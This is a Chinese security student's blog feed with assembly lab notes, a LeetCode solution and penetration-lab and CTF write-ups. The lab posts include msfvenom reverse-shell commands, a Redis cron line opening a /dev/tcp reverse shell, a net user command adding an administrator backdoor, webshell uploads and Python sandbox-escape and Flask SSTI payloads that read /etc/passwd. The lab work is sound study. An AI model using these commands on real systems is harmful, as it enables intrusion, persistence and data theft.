href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://wulidecade.cn/2020/02/15/RMI%E5%85%A5%E9%97%A8/#more" target="_blank" rel="noopener">RMI入门</a></p><p><a href="https://xz.aliyun.com/t/7079#toc-3" target="_blank" rel="noopener">一篇写的很清楚的文章</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jndi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编从入门到入土五</title>
      <link href="/posts/7fad3d80/"/>
      <url>/posts/7fad3d80/</url>
      
        <content type="html"><![CDATA[<h2 id="课后实验"><a href="#课后实验" class="headerlink" title="课后实验"></a>课后实验</h2><h3 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h3><pre><code class="asm">assume cs:code,ds:data,ss:stackdata segment    dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987hdata endsstack segment    dw 0,0,0,0,0,0,0,0stack endscode segmentstart:    mov ax,stack    mov ss,ax    mov sp,16    mov ax,data    mov ds,ax    push ds:[0]    push ds:[2]    pop ds:[2]    pop ds:[0]    mov ax,4c00h    int 21hcode endsend start</code></pre><ol><li>程序返回前,data段中的数据如下：</li></ol><p><img src="/posts/7fad3d80/1585098727870.png" alt></p><ol start="2"><li>程序返回前，cs = 076C, ss=076B,ds=076A</li><li>code段地址如果为X，data段地址为 X-32, stack段地址为X-16</li></ol><h3 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h3><pre><code class="asm">assume cs:code,ds:data,ss:stackdata segment    dw 0123h,0456hdata endsstack segment    dw 0,0stack endscode segmentstart:    mov ax,stack    mov ss,ax    mov sp,16    mov ax,data    mov ds,ax    push ds:[0]    push ds:[2]    pop ds:[2]    pop ds:[0]    mov ax,4c00h    int 21hcode endsend start</code></pre><ol><li>执行程序，返回前，data段中的数据为多少</li></ol><p><img src="/posts/7fad3d80/1585099444358.png" alt></p><ol start="2"><li>程序返回前，cs=076C,ss=076B,ds=076A</li><li>code段地址为X，data段地址为 X-32, stack段地址为 X- 16</li><li></li></ol><h3 id="实验五"><a href="#实验五" class="headerlink" title="实验五"></a>实验五</h3><pre><code class="asm">assume cs:codea segment    db 1,2,3,4,5,6,7,8a endsb segment    db 1,2,3,4,5,6,7,8b endsc segment    db 0,0,0,0,0,0,0,0c endscode segmentstart:    mov ax,a    mov ds,ax    mov ax,b    mov ss,ax    mov ax,c    mov es,ax    mov cx,8    mov bx,0    mov dl,0s:    add dl,ds:[bx]    add dl,ss:[bx]    mov es:[bx], dl    mov dl,0    inc bx    loop s    mov ax,4c00h    int 21hcode endsend start</code></pre><p>将a和b中的数据求和，放到c里面</p><p>执行完成后放在 es 中</p><p><img src="/posts/7fad3d80/1585101726819.png" alt></p><h3 id="实验六"><a href="#实验六" class="headerlink" title="实验六"></a>实验六</h3><pre><code class="asm">assume cs:codea segment         dw 1,2,3,4,5,6,7,8,9,0ah,0bh,0ch,0dh,0eh,0fh,0ffha endsb segment    dw 0,0,0,0,0,0,0,0b endscode segmentstart:    mov ax,b    mov ss,ax    mov sp,10h    mov ax,a    mov ds,ax    mov cx,8    mov bx,0s:    mov dx,ds:[bx]    push dx    inc bx    inc bx    loop s    mov ax,4c00h    int 21hcode endsend start</code></pre><p>将a中的前8个字型数据逆序压入到b中，(注意字型数据是小端存储的)</p><p><img src="/posts/7fad3d80/1585102355893.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编从入门到入土四</title>
      <link href="/posts/624f5fc5/"/>
      <url>/posts/624f5fc5/</url>
      
        <content type="html"><![CDATA[<p>BX 寄存器在内存寻址的作用</p><p><img src="/posts/624f5fc5/1583847161633.png" alt></p><pre><code>mov ax, 2000Hmov ds,axmov bx,1000Hmov ax,[bx]  ; AX=00BEHinc bxinc bxmov [bx],ax  ; BX=1002inc bxinc bxmov [bx],ax  ; BX=1004inc bxmov [bx],al  ; BX=1005inc bx       mov [bx],al  ; BX=1006</code></pre><p>最后得到的内存分布</p><p><img src="/posts/624f5fc5/1583847171666.png" alt></p><h2 id="loop指令的使用"><a href="#loop指令的使用" class="headerlink" title="loop指令的使用"></a>loop指令的使用</h2><pre><code>assume cs:codecode segment    mov ax,2    mov cx,11s:  add ax,ax    loop s</code></pre><p>cx 作为循环的计数器</p><p>计算乘法，123*236</p><pre><code>assume cs:codecode segment    mov ax,0    mov cx,236s:  add ax,123    loop s    mov ax,4c00h    int 21hcode endsend</code></pre><blockquote><p>注意：在汇编程序中，数据不能以字母开头</p></blockquote><p><code>g</code> 指令可以直接执行到指定的位置</p><p><code>p</code> 会自动重复直到 <code>cx == 0</code> 为止</p><h2 id="Debug和masm对指令的不同处理"><a href="#Debug和masm对指令的不同处理" class="headerlink" title="Debug和masm对指令的不同处理"></a>Debug和masm对指令的不同处理</h2><p>在汇编源程序中，我们需要这么写</p><pre><code>mov ax, 2000hmov ds, axmov al, ds:[0]</code></pre><p>如果没有指定段寄存器</p><pre><code>mov al,[0]</code></pre><p>则 <code>masm</code> 理解成</p><pre><code>mov al, 0</code></pre><p>当然如果是寄存器的话</p><pre><code>mov al, [bx]</code></pre><p>则段寄存器默认存在是 ds</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>计算 <code>ffff:0 ~ ffff:b</code> 单元中的数据的和，结果存储在 dx 中</p><p>由于每一个数据都是字节的，不能直接加到16位的寄存器dx中，那么我们是不是可以用dh和dl呢，但是这样可能导致进位丢失</p><p>所以我们需要将8位的数据赋值到16位寄存器然后再与dx相加</p><pre><code class="x86asm">assume cs:codecode segment    mov ax,0ffffh ; 注意数字不能以字母开头    mov ds,ax    mov bx,0 ;首先让 ds:bx 指向 ffff:0    mov dx,0    mov cx,12 ;进行12次循环s:  mov al,[bx]    mov ah,0  ;不要忘记给ah置0！    add dx,ax    inc bx    loop s    mov ax,4c00h    int 21hcode endsend</code></pre><h2 id="如何使用内存空间"><a href="#如何使用内存空间" class="headerlink" title="如何使用内存空间"></a>如何使用内存空间</h2><pre><code>assume cs:codecode segment    mov ax,0    mov ds,ax    mov ds:[26h], ax    mov ax,4c00h    int 21hcode endsend</code></pre><p>程序出问题了，无法继续运行</p><p><img src="/posts/624f5fc5/1583847197500.png" alt></p><p>DOS方式下，一般情况，<code>0:200 ~ 0:2ff</code> 空间中没有系统或其他程序的数据或代码</p><h2 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h2><p>将内存 ffff:0 ~ ffff:b 单元中的数据复制到 0:200 ~ 0:20b 单元中</p><p>可以将两个段的地址保存到两个寄存器中</p><pre><code>assume cs:codecode segment    mov ax,0ffffh    mov ds,ax     mov ax,0020h    mov es,ax    mov bx,0    mov cx,12s:  mov dl,[bx]    mov es:[bx],dl    inc bx    loop s    mov ax,4c00h    int 21hcode endsend</code></pre><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><ol><li>编程，向内存 0:200 ~0:23F 依次传送数据 0 ~63(3FH)</li></ol><p>代码</p><pre><code>assume cs:codecode segment    mov ax,0    mov ds,ax    mov bx,200h    mov cx,40h    mov ax,0s:  mov [bx],ax    inc ax    inc bx    loop s    mov ax, 4c00h    int 21hcode endsend</code></pre><p>运行结果</p><p><img src="/posts/624f5fc5/1583847221964.png" alt></p><ol start="2"><li>编程，向内存 0:200~0:23F 一次传递数据 0~63(3FH),程序中只能使用9条指令<br>如果只能用9条指令，那么可以这么改<pre><code>assume cs:codecode segment mov ax,0 mov ds,ax mov bx,0 mov cx,40hs:  mov [bx+200h],bx ;去掉了 ax，只用bx一个寄存器就可以做到 inc bx loop s mov ax, 4c00h int 21hcode endsend</code></pre>运行结果</li></ol><p><img src="/posts/624f5fc5/1583847232334.png" alt></p><ol start="3"><li><pre><code>assume cs:codecode segment mov ax,cs mov ds,ax mov ax,0020h mov es,ax mov bx,0 mov cx,20hs:  mov al,[bx] mov es:[bx],al inc bx loop s mov ax,4c00h int 21hcode endsend</code></pre></li></ol><p><img src="/posts/624f5fc5/1583847251042.png" alt></p><p>于是可以推测出 CX=17h</p><p>完整代码如下</p><pre><code>assume cs:codecode segment        mov ax,cs    mov ds,ax    mov ax,0020h    mov es,ax    mov bx,0    mov cx,17hs:  mov al,[bx]    mov es:[bx],al    inc bx    loop s    mov ax,4c00h    int 21hcode endsend</code></pre><p><img src="/posts/624f5fc5/1583847262812.png" alt></p><p>可以看到成功复制了</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编从入门到入土三</title>
      <link href="/posts/2e9d33db/"/>
      <url>/posts/2e9d33db/</url>
      
        <content type="html"><![CDATA[<h2 id="从汇编程序开始"><a href="#从汇编程序开始" class="headerlink" title="从汇编程序开始"></a>从汇编程序开始</h2><pre><code class="x86asm">assume cs:codesgcodesg segment    mov ax,0123H    mov bx,0456H    add ax,bx    add ax,ax    mov ax,4c00H    int 21Hcodesg endsend</code></pre><p>伪指令</p><pre><code>段名 segment段名 ends</code></pre><p><code>end</code> 和 <code>ends</code> 不一样， end标记整个程序的结束<br><code>assume</code> 将有特定用途的段和相关的段寄存器关联起来</p><p>程序返回</p><pre><code>    mov ax,4c00H    int 21H</code></pre><p>编写代码，使用 MASM.exe 编译，然后使用 LINK.exe 进行链接</p><p><img src="/posts/2e9d33db/1583847029418.png" alt></p><p><img src="/posts/2e9d33db/1583847034341.png" alt></p><p>运行当然是没有结果的，我们需要使用 <code>debug</code> 调试</p><h2 id="可执行文件的加载过程"><a href="#可执行文件的加载过程" class="headerlink" title="可执行文件的加载过程"></a>可执行文件的加载过程</h2><p>程序加载的时候，找到一个段地址 <code>SA:0000</code>,程序从 <code>SA+10H:0000</code> 处开始运行，<code>SA</code> 存放在 ds寄存器中</p><p>刚加载进内存中时，</p><p><img src="/posts/2e9d33db/1583847094408.png" alt></p><p>此时看到 ds 寄存器的内容为 <code>075AH</code> ,所以程序的物理地址就是 ds+10h ,正好符合<br>在int21 时需要使用 p命令执行</p><p><img src="/posts/2e9d33db/1583847103427.png" alt></p><h2 id="实验3-编译链接跟踪"><a href="#实验3-编译链接跟踪" class="headerlink" title="实验3 编译链接跟踪"></a>实验3 编译链接跟踪</h2><pre><code class="x86asm">assume cs:codesgcodesg segment    mov ax,2000H  ; AX=2000H    mov ss,ax     ; SS=2000H    mov sp,0      ; SP=0    add sp,10     ; SP=10    pop ax        ; SP=000CH, AX=076AH    pop bx        ; SP=000EH, BX=7206H    push ax       ; SP=000CH    push bx       ; SP=000AH     pop ax        ; AX=7c06H    pop bx        ; BX=076AH    mov ax,4c00H    int 21Hcodesg endsend</code></pre><p>PSP 的头两个字节是CD20,用debug加载，查看PSP的内容</p><p><img src="/posts/2e9d33db/1583847116112.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一道leetcode-二叉树的直径</title>
      <link href="/posts/c2fa82b5/"/>
      <url>/posts/c2fa82b5/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一棵二叉树，你需要计算它的直径长度。一棵二叉树的直径长度是任意两个结点路径长度中的最大值。这条路径可能穿过根结点。</p><p>示例 :<br>给定二叉树</p><pre><code>      1     / \    2   3   / \       4   5    </code></pre><p>返回 3, 它的长度是路径 [4,2,1,3] 或者 [5,2,1,3]。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>找到左子树的节点个数，右子树的节点个数，剩下的就好做了</p><p>我写了的lj代码</p><pre><code class="java">package March;/** * @description: 二叉树的直径 * @author: Pxy * @create: 2020-03-10 20:02 **//** * [4,-7,-3,null,null,-9,-3,9,-7,-4,null,6,null,-6,-6,null,null,0,6,5,null,9,null,null,-1,-4,null,null,null,-2] * 上面这个结果过不了 */public class diameterOfBinaryTree {    class TreeNode{        int val;        TreeNode left;        TreeNode right;        TreeNode(int x){            val = x;}    }    public int diameterOfBinaryTree(TreeNode root) {        if (root == null) {            return 0;        }        if (root.right == null) {            return helper(root.left);        } else if (root.left == null) {            return helper(root.right);        } else {            int leftLength = helper(root.left);            int rightLength = helper(root.right);            return leftLength + rightLength;        }    }    public static int helper(TreeNode root) {        if (root != null) {            return Math.max(helper(root.left), helper(root.right)) + 1;        } else {            return 0;        }    }}</code></pre><p>但是leetcode提交的时候给了一个奇葩的测试样例</p><pre><code>[4,-7,-3,null,null,-9,-3,9,-7,-4,null,6,null,-6,-6,null,null,0,6,5,null,9,null,null,-1,-4,null,null,null,-2]</code></pre><p>这。。</p><p><img src="/posts/c2fa82b5/1583846422840.png" alt></p><p>算了我暂时也看不出哪里有问题</p><h2 id="官方"><a href="#官方" class="headerlink" title="官方"></a>官方</h2><pre><code class="java">class Solution {    int ans;    public int diameterOfBinaryTree(TreeNode root) {        ans = 1;        depth(root);        return ans - 1;    }    public int depth(TreeNode node) {        if (node == null) return 0; // 访问到空节点了，返回0        int L = depth(node.left); // 左儿子为根的子树的深度        int R = depth(node.right); // 右儿子为根的子树的深度        ans = Math.max(ans, L+R+1); // 计算d_node即L+R+1 并更新ans        return Math.max(L, R) + 1; // 返回该节点为根的子树的深度    }}</code></pre><p>思路也是比较简单的，不过这个用法很神奇，<code>depth</code> 函数有返回值，这个返回值只在递归的时候用到</p><p>java写OJ的时候如果要用全局变量，只需要在外面写一个就行了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://leetcode-cn.com/problems/diameter-of-binary-tree/solution/liang-chong-si-lu-shi-yong-quan-ju-bian-liang-yu-b/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/diameter-of-binary-tree/solution/liang-chong-si-lu-shi-yong-quan-ju-bian-liang-yu-b/</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞挖掘实验</title>
      <link href="/posts/12fff649/"/>
      <url>/posts/12fff649/</url>
      
        <content type="html"><![CDATA[<p>实验拓扑如下</p><p><img src="/posts/12fff649/1583830717716.png" alt></p><p><img src="/posts/12fff649/1583830733667.png" alt></p><h2 id="任务一-寻找漏洞主机"><a href="#任务一-寻找漏洞主机" class="headerlink" title="任务一 寻找漏洞主机"></a>任务一 寻找漏洞主机</h2><p>扫描存活主机(虽然知道了但还是扫一下)</p><p>注意本机ip是192.168.1.2</p><p><img src="/posts/12fff649/1583830890209.png" alt></p><p>-F 选项快速扫描一下其他主机</p><p><img src="/posts/12fff649/1583830929741.png" alt></p><p><img src="/posts/12fff649/1583830945755.png" alt></p><p>既然是ftp，那么就锁定192.168.1.3</p><p>提示了搜索vsftpd (靶机上搜索太慢了，我在自己机器上搜索的)</p><p><img src="/posts/12fff649/1583831162349.png" alt></p><p>然后使用这个exploit去打就行了</p><p><img src="/posts/12fff649/1583831194224.png" alt></p><p>可以看到进去就是root权限hhhh</p><p>然后还要搜索 1.key 这个文件</p><pre><code>find  / -name 1.key</code></pre><p><img src="/posts/12fff649/1583831225885.png" alt></p><p>读一下就好了</p><h2 id="任务二-使用nikto、crunch和burpsuite进行网站渗透和控制"><a href="#任务二-使用nikto、crunch和burpsuite进行网站渗透和控制" class="headerlink" title="任务二 使用nikto、crunch和burpsuite进行网站渗透和控制"></a>任务二 使用nikto、crunch和burpsuite进行网站渗透和控制</h2><p>此时的目标转向了 192.168.1.4 (192.168.1.3都拿到root了)</p><p>打开网站是 Cms made Simple 简称cms cms</p><p><img src="/posts/12fff649/1583831499729.png" alt></p><p>后台地址 <code>/admin/login.php</code></p><p>先设置一个代理</p><p><img src="/posts/12fff649/1583832214527.png" alt></p><p>然后抓个包</p><p><img src="/posts/12fff649/1583832242295.png" alt></p><p>由于密码是 <code>admin</code> 加上三位数字，如果想用 crunch 生成也行，直接用burp也行</p><p>爆破成功</p><p><img src="/posts/12fff649/1583832729565.png" alt></p><p>进入到网站后台</p><p><img src="/posts/12fff649/1583832774511.png" alt></p><h2 id="任务三-获取webshell权限并拿到目标及开放的远程桌面端口号"><a href="#任务三-获取webshell权限并拿到目标及开放的远程桌面端口号" class="headerlink" title="任务三 获取webshell权限并拿到目标及开放的远程桌面端口号"></a>任务三 获取webshell权限并拿到目标及开放的远程桌面端口号</h2><p>漏洞点在这</p><p><img src="/posts/12fff649/1583833127686.png" alt></p><p>Run一下</p><p><img src="/posts/12fff649/1583833240668.png" alt></p><p>好那我们这里为了避免网页卡顿。用msf生成一个shell.php</p><pre><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 -f raw -o shell.txt</code></pre><p>然后复制到框框里运行一下</p><p>同时msf进行监听</p><p><img src="/posts/12fff649/1583833748737.png" alt></p><p>成功弹到shell。之后再使用msf生成shell.exe</p><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 -f exe -o shell.exe</code></pre><p>上传，重新弹一个shell</p><p><img src="/posts/12fff649/1583833790609.png" alt></p><p>ok这时候就能获得真正的meterpreter了</p><p>查看一下监听端口</p><p><img src="/posts/12fff649/1583833821793.png" alt></p><p>随便猜一个吧2333</p><h2 id="任务四-向目标主机添加用户并控制"><a href="#任务四-向目标主机添加用户并控制" class="headerlink" title="任务四 向目标主机添加用户并控制"></a>任务四 向目标主机添加用户并控制</h2><p>这个步骤和上一个实验比较相似，就不用细说了</p><pre><code>net user hacker Beijing123 /addnet localgroup administrators hacker /add</code></pre><p>远程登陆之后，给文件添加一个用户即可</p><p>最后</p><p><img src="/posts/12fff649/1583833940934.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>企业环境渗透2</title>
      <link href="/posts/c08799e1/"/>
      <url>/posts/c08799e1/</url>
      
        <content type="html"><![CDATA[<h2 id="任务一-weblogic反序列化"><a href="#任务一-weblogic反序列化" class="headerlink" title="任务一 weblogic反序列化"></a>任务一 weblogic反序列化</h2><p>浏览器访问192.168.2.10:7001 然后就404</p><p><img src="/posts/c08799e1/1583826737126.png" alt></p><p>使用工具包中的webloigc利用工具</p><p><img src="/posts/c08799e1/1583826784567.png" alt></p><p>看到flag了是不是，然后执行 <code>cat /home/flag</code> 是吧233333</p><p>其实，这个flag不过就是个目录。。</p><p><img src="/posts/c08799e1/1583826861077.png" alt></p><p>得到flag</p><p><img src="/posts/c08799e1/1583826902355.png" alt="1583826902355"></p><h2 id="任务二-Wrodpress-任意文件读取"><a href="#任务二-Wrodpress-任意文件读取" class="headerlink" title="任务二 Wrodpress 任意文件读取"></a>任务二 Wrodpress 任意文件读取</h2><p>wpscan常规扫描一下</p><p><img src="/posts/c08799e1/1583826949884.png" alt></p><p>存在一个任意文件读取漏洞</p><p><img src="/posts/c08799e1/1583826994083.png" alt></p><h2 id="任务三-Wordpress命令执行"><a href="#任务三-Wordpress命令执行" class="headerlink" title="任务三 Wordpress命令执行"></a>任务三 Wordpress命令执行</h2><ol><li>利用 Burpsuite的 repeater模块修改包探测漏洞存在的字段</li><li>执行wordpress mailer 命令执行漏洞的利用脚本尝试获取shell</li></ol><p>执行 <code>wordpress-rce-exploit.sh</code> 获取到flag</p><p><img src="/posts/c08799e1/1588132036186.png" alt></p><h2 id="任务四-改进漏洞利用脚本获得命令执行权限"><a href="#任务四-改进漏洞利用脚本获得命令执行权限" class="headerlink" title="任务四 改进漏洞利用脚本获得命令执行权限"></a>任务四 改进漏洞利用脚本获得命令执行权限</h2><ol><li>通过分析sendmail中的语法改进作者的漏洞利用脚本，缩短host字段的长度绕过限制</li><li>利用改进后的漏洞利用脚本来获取shell</li></ol><p>修改脚本：</p><p><img src="/posts/c08799e1/1588132544267.png" alt></p><p>执行脚本</p><p><img src="/posts/c08799e1/1588132523479.png" alt></p><p>打开另一个shell 进行监听</p><p><img src="/posts/c08799e1/1588132513711.png" alt></p><p>成功获得反弹的shell</p><p><img src="/posts/c08799e1/1588132491640.png" alt></p><p>使用 <code>python</code> 开启一个服务器</p><p><img src="/posts/c08799e1/1588133151756.png" alt></p><p>上传 <code>tunnel.nosocker.php</code></p><p><img src="/posts/c08799e1/1588133135867.png" alt></p><p>成功上传</p><p><img src="/posts/c08799e1/1588133164733.png" alt></p><p>开启代理：</p><pre><code>python reGeorgSocksProxy.py -p 8080 -u http://192.168.2.11/tunnel.nosocket.php</code></pre><p><img src="/posts/c08799e1/1588134528946.png" alt></p><p>扫描内网</p><pre><code>proxychains nmap -Pn -sT 192.168.1.11</code></pre><p><img src="/posts/c08799e1/1588134555511.png" alt></p><pre><code>proxychains nmap -Pn -sT 192.168.1.10</code></pre><p><img src="/posts/c08799e1/1588134580261.png" alt></p><p>都开放了80端口，并且看出 <code>192.168.1.11</code> 是Windows， <code>192.168.1.10</code> 是Linux</p><h2 id="任务五-redsi未授权访问-ffmpeg任意文件读取"><a href="#任务五-redsi未授权访问-ffmpeg任意文件读取" class="headerlink" title="任务五 redsi未授权访问+ffmpeg任意文件读取"></a>任务五 redsi未授权访问+ffmpeg任意文件读取</h2><ol><li>查看网页信息可知，是通过ffmpeg处理视频的小应用，只有上传，下载和删除功能，此处存在ffmpeg文件读取漏洞，构造特定的avi视频，经过ffmpeg处理之后的视频就会包含想要的文件内容。利用文件读取漏洞获取redis配置文件内容</li><li>redis数据库服务，允许外连且没有设置密码，可以随意访问，此处存在未授权访问漏洞，正常情况下可以写入文件，但是过程中发现，必要的config命令被替换了。而config命令的替换一定是写在redis的配置文件中的，配置文件的路径又可以在redis中执行info获取到，在以上环境中获取到redis服务器的shell</li></ol><p>访问 <code>http://192.168.1.11</code></p><p><img src="/posts/c08799e1/1588134685034.png" alt></p><p>连接 <code>redis</code></p><pre><code>proxychains ./redis-cli -h 192.168.1.11</code></pre><p><img src="/posts/c08799e1/1588134783500.png" alt></p><p>看到配置文件的位置</p><pre><code>/etc/redis/63799.conf</code></pre><p><img src="/posts/c08799e1/1588135266214.png" alt></p><p>下载得到 456.avi</p><p><img src="/posts/c08799e1/1588135317666.png" alt></p><p>发现 <code>config</code> 命令被替换成了 <code>ccoonnffiigg</code></p><p>redis连接，通过计划任务反弹shell</p><pre><code>proxychains ./redis-cli -h 192.168.2.11ccoonnnffiigg set dir /var/spool/cronset xxx &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.2.11/9999 0&amp;&gt;1\n\n&quot;ccoonnnffiigg set dbfilename root</code></pre><p><img src="/posts/c08799e1/1588143052787.png" alt></p><p>成功反弹shell</p><p><img src="/posts/c08799e1/1588142962941.png" alt></p><p><code>/home/flag/flag.txt</code></p><p><img src="/posts/c08799e1/1588142981379.png" alt></p><p><code>/etc/redis/63799.conf</code> </p><p><img src="/posts/c08799e1/1588143001902.png" alt></p><h2 id="任务六-drupal8-远程代码执行"><a href="#任务六-drupal8-远程代码执行" class="headerlink" title="任务六 drupal8 远程代码执行"></a>任务六 drupal8 远程代码执行</h2><ol><li>使用浏览器代理访问内网机器 <code>192.168.1.10</code></li><li>利用drupal8的php反序列化漏洞向目标服务器写入webshell</li><li>使用Cknife连接已经生成的webshell</li></ol><p>设置代理</p><p><img src="/posts/c08799e1/1588143278974.png" alt></p><p>访问</p><p><img src="/posts/c08799e1/1588143264527.png" alt></p><p>弱口令 <code>admin,admin</code>登陆后台</p><p><img src="/posts/c08799e1/1588143532782.png" alt></p><p>访问 <code>http://192.168.1.10/admin/config/development/configurations/single/import</code></p><p>导入 <code>drupal_exp.txt</code> 中的内容</p><p><img src="/posts/c08799e1/1588143822617.png" alt></p><p>网站根目录生成 <code>shell.php</code></p><p><img src="/posts/c08799e1/1588143892842.png" alt></p><p><code>Cknife</code> 连接，设置代理地址</p><p><img src="/posts/c08799e1/1588143796161.png" alt></p><p>第一个flag</p><p><img src="/posts/c08799e1/1588143925249.png" alt></p><p>第二个flag</p><p><img src="/posts/c08799e1/1588143937477.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python沙盒逃逸</title>
      <link href="/posts/ed9dc04e/"/>
      <url>/posts/ed9dc04e/</url>
      
        <content type="html"><![CDATA[<h2 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h2><p>两个重要的类，一般都会用到</p><pre><code class="python">In [44]: object.__subclasses__()[59]Out[44]: warnings.catch_warningsIn [45]: object.__subclasses__()[40]Out[45]: file</code></pre><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><pre><code class="python">().__class__.__bases__[0].__subclasses__()[40](&#39;filename&#39;).readlines()().__class__.__mro__[1].__subclasses__()[40](&#39;filename&#39;).readlines()</code></pre><p>如图</p><p><img src="/posts/ed9dc04e/1582442823657.png" alt></p><pre><code class="python">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].getlines(&#39;/etc/passwd&#39;)</code></pre><p><img src="/posts/ed9dc04e/1582444265686.png" alt></p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><pre><code class="python">().__class__.__base__.__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;]</code></pre><p><img src="/posts/ed9dc04e/1582443624642.png" alt></p><pre><code class="python">().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39;+&#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;popen&#39;](&#39;l&#39;+&#39;s&#39;).read()#也可以写成().__class__.__bases__[.__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__[&#39;os&#39;].popen(&#39;ls&#39;).read()# 等价于object.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;id&#39;).read()</code></pre><p><img src="/posts/ed9dc04e/1582446827696.png" alt></p><p>可以使用 <code>__getattribute__</code> 获得属性， <code>__dict__</code></p><p>寻找可以利用的模块</p><pre><code class="python">search = &#39;os&#39;   #也可以是其他你想利用的模块num = -1for i in ().__class__.__bases__[0].__subclasses__():    num += 1    try:        keys = i.__init__.__globals__.keys()        if search in keys:            print(i, num)    except:        pass &#39;&#39;&#39;(&lt;class &#39;site._Printer&#39;&gt;, 71)(&lt;class &#39;site.Quitter&#39;&gt;, 76)(&lt;class &#39;socket._socketobject&#39;&gt;, 124)...&#39;&#39;&#39;</code></pre><p>比如</p><p><img src="/posts/ed9dc04e/1582443247342.png" alt></p><p>来自其他师傅的</p><pre><code class="python">object.__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)object.__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)object.__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()object.__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;id&#39;).read()</code></pre><h2 id="py2和3通吃"><a href="#py2和3通吃" class="headerlink" title="py2和3通吃"></a>py2和3通吃</h2><pre><code class="python">search = &#39;__builtins__&#39;   #也可以是其他你想利用的模块num = -1for i in ().__class__.__bases__[0].__subclasses__():    num += 1    try:        keys = i.__init__.__globals__.keys()        if search in keys:            print(i, num)    except:        pass </code></pre><p>python2 举例</p><pre><code class="python">().__class__.__bases__[0].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</code></pre><p><img src="/posts/ed9dc04e/1582446435900.png" alt></p><p>python3</p><pre><code class="python">().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</code></pre><p><img src="/posts/ed9dc04e/1582443435704.png" alt></p><h2 id="python3-读文件"><a href="#python3-读文件" class="headerlink" title="python3 读文件"></a>python3 读文件</h2><pre><code class="python">In [64]: &quot;&quot;.__class__.__bases__[0].__subclasses__()[127]Out[64]: os._wrap_close&quot;&quot;.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__[&#39;popen&#39;](&#39;cat /etc/&#39;+&#39;passwd&#39;).read()</code></pre><p>i春秋比赛的一道题的payload</p><pre><code class="python">{{"".__class__.__bases__[0].__subclasses__()[127].__init__.__globals__['po'+'pen']('cat this_is_the_fl'+'ag.txt').read()}}# waf 拦截了 popen 和 flag</code></pre><h2 id="flask-SSTI"><a href="#flask-SSTI" class="headerlink" title="flask SSTI"></a>flask SSTI</h2><p>常用的</p><pre><code class="python">{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}</code></pre><h3 id="request对象"><a href="#request对象" class="headerlink" title="request对象"></a>request对象</h3><p> 这个对象指的是当前请求对象，<code>request.environ</code>对象是一个与服务器环境相关的对象字典。值得一提的是，可以通过访问<code>request.args.get</code> <code>request.cookies</code> 